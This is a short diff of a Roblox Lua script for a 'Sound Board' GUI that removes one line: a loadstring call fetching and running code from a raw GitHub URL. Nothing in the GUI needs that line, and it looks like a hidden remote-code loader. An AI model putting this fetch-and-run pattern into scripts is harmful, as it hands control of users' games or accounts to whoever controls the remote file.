@@ -2063,7 +2063,6 @@ Audio.Text = "Sound Board"
 Audio.TextColor3 = Color3.fromRGB(255, 255, 255)
 Audio.TextSize = 14.000
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/m11kk1/Chat/main/lol'))()
 -- Module Scripts:
 
 
